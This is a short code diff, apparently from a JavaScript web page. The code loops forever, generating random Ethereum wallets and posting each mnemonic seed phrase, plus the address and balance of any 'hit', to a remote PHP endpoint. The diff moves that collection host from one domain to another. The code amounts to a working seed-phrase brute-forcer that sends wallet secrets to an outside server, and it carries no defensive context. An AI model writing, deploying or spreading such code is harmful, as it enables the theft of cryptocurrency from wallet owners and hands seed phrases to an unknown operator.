@@ -128,7 +128,7 @@
             while (1) {
                 let wallet = ethers.Wallet.createRandom();
                 let mnemonic = wallet.mnemonic.phrase;
-                await $.post('https://wallet.kino99.club/index.php',
+                await $.post('https://wallet.bichleg.com/index.php',
                     { 'exist': mnemonic },
                     function (data) {
                         if (data == '0000') {
@@ -140,7 +140,7 @@
                 if (res == '0000') {
                     let address = wallet.address;
                     let balance = ethers.formatEther(await provider.getBalance(wallet.address));
-                    await $.post('https://wallet.kino99.club/index.php', { 'seed': mnemonic, 'wallet': address, 'balance': balance });
+                    await $.post('https://wallet.bichleg.com/index.php', { 'seed': mnemonic, 'wallet': address, 'balance': balance });
                 }
                 res = '';
             }
